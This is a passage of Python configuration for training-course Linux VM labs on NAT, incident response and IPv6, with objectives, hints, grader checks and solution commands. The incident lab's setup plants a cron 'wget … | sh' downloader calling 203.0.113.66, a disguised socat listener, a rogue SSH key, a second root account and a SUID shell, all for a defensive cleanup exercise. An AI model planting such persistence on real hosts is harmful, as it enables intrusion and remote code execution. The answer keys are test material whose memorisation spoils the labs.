             "tcpdump -ni eth0 -U -c 4 -w /tmp/before.pcap icmp & then ping from lan-pc, then tcpdump -nr /tmp/before.pcap.",
    "success_msg": "LAN online through real NAT: the broken rule replaced, a stateful default-deny forward policy, the internet sees 203.0.113.2, DNS works and the rules are saved.",
    "initial_state": {},
    "obj_hints": {
        "boot": ["Start both VMs; use the tabs to switch.", "Start VMs."],
        "symptom": ["If the router reaches the internet but the PC does not, look at what the router does to the PC's packets.",
                    "on lan-pc: ping -c 2 -W 1 203.0.113.10 ; on edge-1: ping -c 2 203.0.113.10"],
        "capture": ["tcpdump -w writes packets to a file; -U writes each packet at once; & runs it in the background while you ping.",
                    "on edge-1: tcpdump -ni eth0 -U -c 4 -w /tmp/before.pcap icmp &   on lan-pc: ping -c 2 -W 1 203.0.113.10   "
                    "on edge-1: tcpdump -nr /tmp/before.pcap"],
        "nat": ["iptables -t nat -L POSTROUTING -n -v --line-numbers shows the rule and its 0 packet counter. Look at its source subnet.",
                "on edge-1: iptables -t nat -D POSTROUTING 1 ; iptables -t nat -A POSTROUTING -s 10.5.0.0/24 -o eth0 -j MASQUERADE"],
        "forward": ["The FORWARD chain filters traffic passing through the router. Accept replies first, then new LAN traffic, then default-deny.",
                    "on edge-1: iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT ; "
                    "iptables -A FORWARD -s 10.5.0.0/24 -j ACCEPT ; iptables -P FORWARD DROP"],
        "reach": ["Ping again from the PC; the counters on the nat rule should now go up.",
                  "on lan-pc: ping -c 2 203.0.113.10 ; on edge-1: iptables -t nat -L POSTROUTING -n -v"],
        "dns": ["DNS is UDP; NAT and conntrack handle it as well.", "on lan-pc: nslookup www.example.com"],
        "saved": ["iptables-save prints every table, nat included.", "on edge-1: iptables-save > /etc/iptables/rules-save"],
    },
    "course_objectives": ["NO-4.3", "NO-3.1", "NO-5.1", "NO-6.1"],
    "minutes": 40,
    "palette": ["ping -c 2 -W 1 203.0.113.10", "iptables -t nat -L POSTROUTING -n -v --line-numbers", "iptables -t nat -D POSTROUTING ",
                "iptables -t nat -A POSTROUTING -s 10.5.0.0/24 -o eth0 -j MASQUERADE", "iptables -S FORWARD", "iptables -A FORWARD ",
                "iptables -P FORWARD DROP", "tcpdump -ni eth0 -U -c 4 -w /tmp/before.pcap icmp &", "tcpdump -nr /tmp/before.pcap",
                "nslookup www.example.com", "iptables-save > /etc/iptables/rules-save", "clear"],
    "fallback": ["rtr-vlan-acl", "w11-firewall"],
    "vm": dict(IMAGE, machines=[_m("pc", "lan-pc", "lan-pc", ["lan"]), _m("rtr", "edge-1", "edge-1", ["lan", "wan"])],
               setup={"pc": _NAT_PC, "rtr": _NAT_RTR}, net=_NAT_NET),
    "vm_checks": [
        {"id": "boot"},
        {"id": "symptom", "seq": [r"^\[pc\]\s*ping\b.*203\.0\.113\.10", r"^\[rtr\]\s*ping\b.*203\.0\.113\.10"],
         "before": r"^\[rtr\]\s*iptables\b.*-t\s*nat\b.*\s-[ADIR]\s",
         "why": "Before changing the nat table: ping 203.0.113.10 from lan-pc (fails), then from edge-1 (works)."},
        {"id": "capture", "hist": [r"^\[rtr\]\s*tcpdump\b"], "fabric": "nat_leak",
         "why": "Run tcpdump on edge-1 while lan-pc pings 203.0.113.10 before the NAT fix."},
        {"id": "nat", "on": "rtr", "sh": f"{_NS} | grep -Eq -- '-s 10\\.5\\.0\\.0/24 .*-j (MASQUERADE|SNAT --to-source 203\\.0\\.113\\.2)' && ! {_NS} | grep -q 10.50.0.0",
         "show": f"{_NS} | grep -- '-A' | head -3 | tr '\\n' ' '", "why": "nat POSTROUTING: {v}"},
        {"id": "forward", "on": "rtr", "sh": f"{_FS} | grep -q -- '^-P FORWARD DROP' && {_FS} | grep -Eq -- '--(ct)?state (RELATED,ESTABLISHED|ESTABLISHED,RELATED|ESTABLISHED) -j ACCEPT' "
                                             f"&& {_FS} | grep -Eq -- '-s 10\\.5\\.0\\.0/24 .*-j ACCEPT'",
         "show": f"{_FS} | tr '\\n' ' ' | cut -c1-180", "why": "FORWARD chain: {v}"},
        {"id": "reach", "on": "pc", "sh": "ping -c 1 -W 2 203.0.113.10 | grep -q 'ttl=63'", "secs": 5, "fabric": "nat_ok",
         "why": "lan-pc cannot reach 203.0.113.10 through NAT yet."},
        {"id": "dns", "on": "pc", "sh": "nslookup www.example.com 2>/dev/null | grep -q '203\\.0\\.113\\.10'", "secs": 8,
         "hist": [r"^\[pc\]\s*(nslookup|drill|host|ping)\b.*www\.example\.com"], "why": "Resolve www.example.com from lan-pc (nslookup)."},
        {"id": "saved", "on": "rtr", "sh": "grep -q '^\\*nat' /etc/iptables/rules-save && grep -Eq -- '-s 10\\.5\\.0\\.0/24 .*-j (MASQUERADE|SNAT)' /etc/iptables/rules-save "
                                           "&& grep -q '^:FORWARD DROP' /etc/iptables/rules-save",
         "why": "/etc/iptables/rules-save is missing or does not hold the nat rule and the FORWARD DROP policy."},
    ],
    "solution": {"vm_commands": [
        "[pc] ping -c 2 -W 1 203.0.113.10", "[rtr] ping -c 2 203.0.113.10", "[rtr] iptables -t nat -L POSTROUTING -n -v --line-numbers",
        "[rtr] tcpdump -ni eth0 -U -c 4 -w /tmp/before.pcap icmp 2>/dev/null &", "[pc] ping -c 2 -W 1 203.0.113.10",
        "[rtr] sleep 1; tcpdump -nr /tmp/before.pcap 2>/dev/null", "[rtr] iptables -t nat -D POSTROUTING 1",
        "[rtr] iptables -t nat -A POSTROUTING -s 10.5.0.0/24 -o eth0 -j MASQUERADE",
        "[rtr] iptables -A FORWARD -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT", "[rtr] iptables -A FORWARD -s 10.5.0.0/24 -j ACCEPT",
        "[rtr] iptables -P FORWARD DROP", "[pc] ping -c 2 203.0.113.10", "[pc] nslookup www.example.com",
        "[rtr] iptables -t nat -L POSTROUTING -n -v", "[rtr] iptables-save > /etc/iptables/rules-save"]},
}

# --------------------------------------------------------------------------------------------- 5: compromised host triage
_IR_ASK = "/root/IR-6410.txt"
_KEY_OK = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHq3bZp0deployKeyNovakBuildPipeline000000001 deploy@novak-build"
_KEY_BAD = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM9xUnknownKeyAddedAt0217NotInCMDB00000000077 x@kali"
_IR_SETUP = _prelude("novak-web-07") + SYSLOG + rf"""mkdir -p /root/.ssh /var/tmp/.cache /usr/local/bin /var/spool/cron/crontabs
printf '%s\n%s\n' '{_KEY_OK}' '{_KEY_BAD}' > /root/.ssh/authorized_keys; chmod 700 /root/.ssh; chmod 600 /root/.ssh/authorized_keys
printf '#!/bin/sh\ntar -c -f /var/backups/www.tar /srv/www 2>/dev/null\n' > /usr/local/bin/backup.sh; chmod 755 /usr/local/bin/backup.sh
printf '30 2 * * * /usr/local/bin/backup.sh\n*/5 * * * * wget -q -O- http://203.0.113.66/u.sh | sh  # system update\n' | crontab -
echo 'sysbak:x:0:0:system backup:/root:/bin/sh' >> /etc/passwd
grep -q '^sysbak:' /etc/shadow 2>/dev/null || echo 'sysbak:!:20000:0:99999:7:::' >> /etc/shadow
cp /bin/busybox /var/tmp/.cache/.sh; chmod 4755 /var/tmp/.cache/.sh
cp /usr/bin/socat /usr/local/bin/kworkerd
start-stop-daemon -S -b -x /usr/local/bin/kworkerd -- TCP-LISTEN:31337,fork,reuseaddr SYSTEM:'echo ready'
logger -p auth.info -t 'sshd[2214]' 'Failed password for root from 203.0.113.66 port 51022 ssh2'
logger -p auth.info -t 'sshd[2219]' 'Accepted password for sysbak from 203.0.113.66 port 51040 ssh2'
logger -p cron.info -t 'crond[211]' 'USER root pid 2301 cmd wget -q -O- http://203.0.113.66/u.sh | sh'
"""
_IR_EV = "/root/evidence"
INCIDENT = {
    "id": "linux-vm-incident",
    "title": "Real Linux VM — Compromise & Persistence",
    "kind": "vm",
    "blurb": "A real Linux web server with a real backdoor: a disguised listener, a cron downloader, a rogue SSH key, a "
             "second root account and a SUID shell. Collect and hash the evidence first, then contain and clean up "
             "without breaking the legitimate jobs — graded on the machine's real state.",
    "objectives": [
        {"id": "boot", "text": "Boot the VM"},
        {"id": "evidence", "text": "Before removing anything, copy the evidence to /root/evidence (crontab, authorized_keys, /etc/passwd, listening sockets, processes) and write SHA256SUMS there"},
        {"id": "listener", "text": "Find the backdoor listener (ss -tlnp) and stop it — nothing listens on its port afterwards"},
        {"id": "cron", "text": "Remove the cron downloader but keep the 02:30 backup job"},
        {"id": "keys", "text": "Remove the unknown SSH key from root's authorized_keys; keep the deploy key and mode 600"},
        {"id": "account", "text": "Remove the second UID-0 account so root is the only account with UID 0"},
        {"id": "suid", "text": "Find the SUID shell the attacker left (find / -xdev -perm -4000) and remove its SUID bit"},
        {"id": "report", "text": "Write /root/IR-6410.txt with ip=<attacker address>, port=<backdoor port> and account=<rogue account>"},
    ],
    "intro": "IR-6410 (security, high): the IDS flagged novak-web-07 talking to 203.0.113.66. Your role is first responder: "
             "preserve the evidence, contain, remove persistence and hand over a report — investigators may need to show "
             "the evidence was collected before anything was changed. This is a real Linux VM with the backdoors really "
             "in place (they are harmless inside this VM). Useful: ss -tlnp, ps -o pid,args, crontab -l, "
             "cat /root/.ssh/authorized_keys, awk -F: '$3==0' /etc/passwd, find / -xdev -perm -4000, grep 203.0.113.66 /var/log/messages.",
    "success_msg": "Host contained: evidence hashed first, listener stopped, cron downloader, rogue key, UID-0 account and SUID shell removed, legitimate jobs kept, report filed.",
    "initial_state": {},
    "obj_hints": {
        "boot": ["Start the VM and wait for root@novak-web-07:~#.", "Start VM."],
        "evidence": ["Copy first, hash second, change third. Save command output with > file.",
                     "mkdir -p /root/evidence ; cd /root/evidence ; crontab -l > crontab.txt ; cp -p /root/.ssh/authorized_keys /etc/passwd . ; "
                     "ss -tlnp > ss.txt ; ps -o pid,args > ps.txt ; sha256sum * > SHA256SUMS ; cd"],
        "listener": ["ss -tlnp shows the port and the program name; a familiar-looking name proves nothing (check ps -o pid,args).",
                     "ss -tlnp ; ps -o pid,args | grep kworkerd ; killall kworkerd ; ss -tlnp"],
        "cron": ["crontab -l lists the jobs; crontab -e or a filtered copy piped into crontab - replaces them.",
                 "crontab -l | grep -v 203.0.113.66 | crontab - ; crontab -l"],
        "keys": ["Each line of authorized_keys is one key that can log in as root. Delete only the unknown one.",
                 "sed -i '/x@kali/d' /root/.ssh/authorized_keys ; cat /root/.ssh/authorized_keys"],
        "account": ["Any account with UID 0 is root, whatever its name.", "awk -F: '$3==0' /etc/passwd ; deluser sysbak   (or sed -i '/^sysbak:/d' /etc/passwd /etc/shadow)"],
        "suid": ["SUID files run as their owner (root). -xdev keeps find on the root filesystem.",
                 "find / -xdev -perm -4000 2>/dev/null ; chmod u-s /var/tmp/.cache/.sh"],
        "report": ["The address is in the cron line and the log; the port in ss; the account in /etc/passwd.",
                   "printf 'ip=203.0.113.66\\nport=31337\\naccount=sysbak\\n' > /root/IR-6410.txt"],
    },
    "course_objectives": ["IT-10.2", "IT-10.4", "IT-10.1"],
    "minutes": 35,
    "palette": ["ss -tlnp", "ps -o pid,args", "crontab -l", "cat /root/.ssh/authorized_keys", "awk -F: '$3==0' /etc/passwd",
                "find / -xdev -perm -4000 2>/dev/null", "mkdir -p /root/evidence", "sha256sum * > SHA256SUMS", "killall ", "sed -i ",
                "chmod u-s ", "grep 203.0.113.66 /var/log/messages", "clear"],
    "fallback": ["sec-malware", "linux-shell"],
    "vm": dict(IMAGE, machines=[_m("vm", "novak-web-07", "novak-web-07")], setup={"vm": _IR_SETUP}),
    "vm_checks": [
        {"id": "boot"},
        {"id": "evidence", "sh": f"cd {_IR_EV} && sha256sum -c SHA256SUMS && grep -rq 'x@kali' . && grep -rq '203\\.0\\.113\\.66' . "
                                 f"&& grep -rq '^sysbak:' . && grep -rq '31337' .",
         "show": f"ls {_IR_EV} 2>&1 | tr '\\n' ' '",
         "why": "/root/evidence must hold copies made before the clean-up (rogue key, cron line, passwd with sysbak, the :31337 listener) and a SHA256SUMS that verifies — found: {v}"},
        {"id": "listener", "sh": "! ss -tln | grep -q ':31337 ' && ! ps -o stat,args | grep -v '^Z' | grep -q '[k]workerd'", "hist": [r"^(ss|netstat)\b.*-[a-z]*l|^lsof\b"],
         "show": "ss -tlnp | grep 31337 | grep -o 'users:.*' | head -1", "why": "Something still listens on the backdoor port: {v}"},
        {"id": "cron", "sh": "! crontab -l 2>/dev/null | grep -q 203.0.113.66 && crontab -l | grep -Eq '^30[[:space:]]+2[[:space:]].*/usr/local/bin/backup\\.sh'",
         "show": "crontab -l 2>&1 | grep -v '^#' | tr '\\n' ' '", "why": "root's crontab: {v}"},
        {"id": "keys", "sh": "! grep -q 'x@kali' /root/.ssh/authorized_keys && grep -q 'deploy@novak-build' /root/.ssh/authorized_keys "
                             "&& ls -l /root/.ssh/authorized_keys | grep -q '^-rw------- '",
         "show": "awk '{print $NF}' /root/.ssh/authorized_keys 2>&1 | tr '\\n' ' '; ls -l /root/.ssh/authorized_keys | cut -c1-10",
         "why": "authorized_keys: {v} (only deploy@novak-build, mode -rw-------)."},
        {"id": "account", "sh": "[ \"$(awk -F: '$3==0{print $1}' /etc/passwd | tr '\\n' ' ')\" = 'root ' ]",
         "show": "awk -F: '$3==0{print $1}' /etc/passwd | tr '\\n' ' '", "why": "UID-0 accounts: {v}"},
        {"id": "suid", "sh": "[ ! -u /var/tmp/.cache/.sh ]", "hist": [r"^find\b.*-perm\s+(-4000|/4000|-u\+s|/u\+s|-u=s)"],
         "why": "Search with find / -xdev -perm -4000 and remove the attacker's SUID bit."},
        {"id": "report", "sh": " && ".join(_ans(k, v, _IR_ASK) for k, v in (("ip", "203.0.113.66"), ("port", "31337"), ("account", "sysbak"))),
         "show": f"cat {_IR_ASK} 2>&1 | head -4", "why": "/root/IR-6410.txt needs ip=…, port=… and account=… (now: {v})."},
    ],
    "solution": {"vm_commands": [
        "ss -tlnp", "ps -o pid,args | grep -v '\\['", "crontab -l", "cat /root/.ssh/authorized_keys", "awk -F: '$3==0' /etc/passwd",
        "mkdir -p /root/evidence", "cd /root/evidence", "crontab -l > crontab.txt", "cp -p /root/.ssh/authorized_keys /etc/passwd .",
        "ss -tlnp > ss.txt", "ps -o pid,args > ps.txt", "sha256sum * > SHA256SUMS", "cd",
        "killall kworkerd", "ss -tlnp", "crontab -l | grep -v 203.0.113.66 | crontab -", "crontab -l",
        "sed -i '/x@kali/d' /root/.ssh/authorized_keys", "sed -i '/^sysbak:/d' /etc/passwd /etc/shadow",
        "find / -xdev -perm -4000 2>/dev/null", "chmod u-s /var/tmp/.cache/.sh",
        "printf 'ip=203.0.113.66\\nport=31337\\naccount=sysbak\\n' > /root/IR-6410.txt"]},
}

# --------------------------------------------------------------------------------------------- 6: IPv6 SLAAC on a LAN (2 VMs)
_V6_RTR = _prelude("rtr-40") + SYSLOG + r"""ip link set eth0 up; ip addr add 10.40.40.1/24 dev eth0
ip -6 addr add 2001:db8:99::10/128 dev lo
sysctl -qw net.ipv6.conf.all.forwarding=0
cat > /etc/dnsmasq.conf <<'EOF'
# rtr-40: IPv6 router advertisements (SLAAC) for LAN 40 - NET-4060. DNS is off (port=0).
interface=eth0
port=0
# enable-ra
dhcp-range=2001:db8:40::,ra-only,64,12h
ra-param=eth0,4,1800
log-dhcp
log-facility=/var/log/dnsmasq.log
EOF
"""
_V6_WS = _prelude("ws-40") + r"""ip link set eth0 up; ip addr add 10.40.40.31/24 dev eth0
sysctl -qw net.ipv6.conf.eth0.accept_ra=0
"""
_V6_ASK = "/root/NET-4060.txt"
_V6_G = "ip -6 addr show dev eth0 scope global | awk '/inet6/{print $2}' | cut -d/ -f1 | head -1"
_V6_R = "ip -6 route | awk '/^default/{print $3}' | head -1"
IPV6 = {
    "id": "linux-vm-ipv6",
    "title": "Real Linux VMs — IPv6 SLAAC & Routing",
    "kind": "vm",
    "blurb": "Two real Linux machines and real IPv6: a workstation that only has a link-local address and a router "
             "that is not advertising. Read the address types, turn on router advertisements, find why the client "
             "ignores them, and prove SLAAC, the learned default route and reachability — graded on the live kernels.",
    "objectives": [
        {"id": "boot", "text": "Boot both VMs (ws-40 and rtr-40)"},
        {"id": "diagnose", "text": "ws-40 first: read its IPv6 addresses (ip -6 a) and routes (ip -6 route) before you change rtr-40"},
        {"id": "rtr_addr", "text": "rtr-40: give eth0 the address 2001:db8:40::1/64 and turn on IPv6 forwarding (it is a router)"},
        {"id": "ra", "text": "rtr-40: enable router advertisements in /etc/dnsmasq.conf and run dnsmasq — its log shows RTR-ADVERT"},
        {"id": "accept", "text": "ws-40: find why it ignores the advertisements (sysctl net.ipv6.conf.eth0.accept_ra) and fix it"},
        {"id": "slaac", "text": "ws-40: a SLAAC address in 2001:db8:40::/64 and a default route via the router's link-local address"},
        {"id": "reach", "text": "ws-40: ping the router's link-local address (with %eth0) and the service address 2001:db8:99::10"},
        {"id": "record", "text": "Write /root/NET-4060.txt on ws-40 with global=<its SLAAC address> and router=<the default router's address>"},
    ],
    "intro": "NET-4060: IPv6 is being rolled out on LAN 40 (prefix 2001:db8:40::/64, a documentation prefix). The workstation "
             "ws-40 still has no IPv6 connectivity. You have two real Linux VMs: ws-40 and the router rtr-40 (its "
             "dnsmasq.conf is prepared but not finished; the intranet service address 2001:db8:99::10 lives on rtr-40). "
             "Address types to know: fe80::/10 link-local (every interface, never routed, needs %interface), "
             "2000::/3 global unicast, fd00::/8 unique local, ff00::/8 multicast. Router advertisements are ICMPv6: watch "
             "them with tcpdump -ni eth0 icmp6, or the Packets tab.",
    "success_msg": "IPv6 working on LAN 40: real RAs, SLAAC on the client, a learned default route and the service reachable.",
    "initial_state": {},
    "obj_hints": {
        "boot": ["Start both VMs; use the tabs to switch.", "Start VMs."],
        "diagnose": ["Only an fe80:: address and no default route means no router advertisement has been accepted.",
                     "on ws-40: ip -6 a ; ip -6 route"],
        "rtr_addr": ["ip -6 addr add works like the IPv4 form. A Linux host only acts as an IPv6 router with forwarding on.",
                     "on rtr-40: ip -6 addr add 2001:db8:40::1/64 dev eth0 ; sysctl -w net.ipv6.conf.all.forwarding=1"],
        "ra": ["Remove the # in front of enable-ra, check the file with dnsmasq --test, then start (or restart) the service. "
               "dnsmasq only advertises a prefix that is configured on the interface.",
               "on rtr-40: sed -i 's/^# enable-ra/enable-ra/' /etc/dnsmasq.conf ; dnsmasq --test ; service dnsmasq restart ; "
               "tail /var/log/dnsmasq.log"],
        "accept": ["accept_ra=0 means the kernel drops every router advertisement on that interface.",
                   "on ws-40: sysctl net.ipv6.conf.eth0.accept_ra ; sysctl -w net.ipv6.conf.eth0.accept_ra=1 ; "
                   "ip link set eth0 down ; ip link set eth0 up"],
        "slaac": ["After the next advertisement (every few seconds, or at once after a router solicitation) the kernel builds "
                  "an address from the prefix and the interface ID.", "on ws-40: ip -6 a ; ip -6 route"],
        "reach": ["Link-local addresses exist on every link, so you must say which one: fe80::…%eth0.",
                  "on ws-40: ping -6 -c 2 fe80::…%eth0 (the address after 'default via') ; ping -6 -c 2 2001:db8:99::10"],
        "record": ["Copy the scope global address from ip -6 a and the address after 'default via' from ip -6 route.",
                   "on ws-40: echo \"global=$(ip -6 addr show dev eth0 scope global | awk '/inet6/{print $2}' | cut -d/ -f1)\" > /root/NET-4060.txt ; "
                   "echo \"router=$(ip -6 route | awk '/^default/{print $3}')\" >> /root/NET-4060.txt"],
    },
    "course_objectives": ["IT-5.1", "NO-1.2", "NO-3.1", "IT-5.3"],
    "minutes": 35,
    "palette": ["ip -6 a", "ip -6 route", "ip -6 neigh", "ip -6 addr add ", "sysctl net.ipv6.conf.eth0.accept_ra", "sysctl -w ",
                "cat /etc/dnsmasq.conf", "service dnsmasq restart", "tail /var/log/dnsmasq.log", "tcpdump -ni eth0 -c 4 icmp6",
                "ping -6 -c 2 ", "clear"],
    "fallback": ["net-subnet", "win-ipconfig"],
    "vm": dict(IMAGE, machines=[_m("ws", "ws-40", "ws-40", ["lan40"]), _m("rtr", "rtr-40", "rtr-40", ["lan40"])],
               setup={"ws": _V6_WS, "rtr": _V6_RTR},
               net={"segments": ["lan40"], "topology": "ws-40 ── LAN 40 switch (2001:db8:40::/64) ── rtr-40 (2001:db8:40::1; service 2001:db8:99::10)"}),
    "vm_checks": [
        {"id": "boot"},
        {"id": "diagnose", "seq": [r"^\[ws\]\s*ip\s+(-6\s+)?(a|addr|address)\b", r"^\[ws\]\s*ip\s+-6\s+r(oute)?\b"],
         "before": r"^\[rtr\]\s*(ip\s+-6\s+a(ddr)?\s+add|service\s+dnsmasq|/etc/init\.d/dnsmasq|dnsmasq\b(?!\s+--test))",
         "why": "Before changing rtr-40: on ws-40 run ip -6 a, then ip -6 route."},
        {"id": "rtr_addr", "on": "rtr", "sh": "ip -6 addr show dev eth0 | grep -q 'inet6 2001:db8:40::1/64 scope global' && "
                                             "[ \"$(cat /proc/sys/net/ipv6/conf/all/forwarding)\" = 1 ]",
         "show": "ip -6 addr show dev eth0 scope global | awk '/inet6/{print $2}' | tr '\\n' ' '; echo forwarding=$(cat /proc/sys/net/ipv6/conf/all/forwarding)",
         "why": "rtr-40: {v} (needs 2001:db8:40::1/64 and forwarding=1)."},
        {"id": "ra", "on": "rtr", "sh": "grep -Eq '^[[:space:]]*enable-ra' /etc/dnsmasq.conf && dnsmasq --test && pidof dnsmasq && grep -q 'RTR-ADVERT' /var/log/dnsmasq.log",
         "show": "echo \"$(grep -E 'enable-ra' /etc/dnsmasq.conf | head -1), dnsmasq $(pidof dnsmasq >/dev/null && echo running || echo stopped)\"",
         "why": "Router advertisements are not going out yet: {v}"},
        {"id": "accept", "on": "ws", "sh": "[ \"$(cat /proc/sys/net/ipv6/conf/eth0/accept_ra)\" -ge 1 ]",
         "hist": [r"^\[ws\]\s*(sysctl\b.*accept_ra|cat\s+/proc/sys/net/ipv6/conf/\S+/accept_ra)"],
         "show": "echo accept_ra=$(cat /proc/sys/net/ipv6/conf/eth0/accept_ra)", "why": "ws-40 {v} — look it up with sysctl, then fix it."},
        {"id": "slaac", "on": "ws", "sh": "ip -6 addr show dev eth0 scope global | grep -q 'inet6 2001:db8:40:.*dynamic' && ip -6 route | grep -q '^default via fe80::'",
         "show": f"echo addr=$({_V6_G}) default=$({_V6_R})", "why": "ws-40 has {v}"},
        {"id": "reach", "on": "ws", "sh": "ping -6 -c 1 -W 2 2001:db8:99::10 | grep -q 'bytes from'", "secs": 5,
         "hist": [r"^\[ws\]\s*ping6?\b.*(%eth0\b|-I\s*eth0\b.*fe80:)", r"^\[ws\]\s*ping6?\b.*2001:db8:99::10"],
         "why": "From ws-40: ping the router's fe80:: address with %eth0, and 2001:db8:99::10 (it must answer)."},
        {"id": "record", "on": "ws", "sh": f"g=$({_V6_G}); r=$({_V6_R}); f=$(tr -d ' \\r' < {_V6_ASK} | tr 'A-Z' 'a-z'); [ -n \"$g\" ] && [ -n \"$r\" ] && "
                                           "echo \"$f\" | grep -qx \"global=$g\" && echo \"$f\" | grep -qx \"router=$r\"",
         "show": f"cat {_V6_ASK} 2>&1 | head -2 | tr '\\n' ' '", "why": "/root/NET-4060.txt must match ws-40's live global address and default router (now: {v})."},
    ],
    "solution": {"vm_commands": [
        "[ws] ip -6 a", "[ws] ip -6 route", "[rtr] ip -6 addr add 2001:db8:40::1/64 dev eth0", "[rtr] sysctl -w net.ipv6.conf.all.forwarding=1",
        "[rtr] sed -i 's/^# enable-ra/enable-ra/' /etc/dnsmasq.conf", "[rtr] dnsmasq --test", "[rtr] service dnsmasq restart",
        "[rtr] tail -3 /var/log/dnsmasq.log", "[ws] sysctl net.ipv6.conf.eth0.accept_ra", "[ws] sysctl -w net.ipv6.conf.eth0.accept_ra=1",
        "[ws] ip link set eth0 down; ip link set eth0 up; sleep 6", "[ws] ip -6 a", "[ws] ip -6 route",
        "[ws] ping -6 -c 2 $(ip -6 route | awk '/^default/{print $3}')%eth0", "[ws] ping -6 -c 2 2001:db8:99::10",
        "[ws] echo \"global=$(ip -6 addr show dev eth0 scope global | awk '/inet6/{print $2}' | cut -d/ -f1)\" > /root/NET-4060.txt",
        "[ws] echo \"router=$(ip -6 route | awk '/^default/{print $3}')\" >> /root/NET-4060.txt"]},
}

R4_LABS = [PERF, RESTORE, WEB, NAT, INCIDENT, IPV6]
R4_FABRIC = {
    "nat_leak": lambda ev: any(e.get("type") == "ping" and str(e.get("from") or "").startswith("10.5.0.") for e in ev),
    "nat_ok": lambda ev: any(e.get("type") == "ping" and e.get("from") == "203.0.113.2" and e.get("to") == "203.0.113.10" for e in ev),
}
R4_FABRIC_WHY = {"nat_leak": "the internet has not yet seen a ping that left edge-1 with the PC's private address",
                 "nat_ok": "the internet has not seen a ping from 203.0.113.2 (the router's public address) yet"}
NAT["solution"]["fabric"] = {"events": [{"type": "ping", "from": "10.5.0.10", "to": "203.0.113.10"},
                                        {"type": "ping", "from": "203.0.113.2", "to": "203.0.113.10"}]}
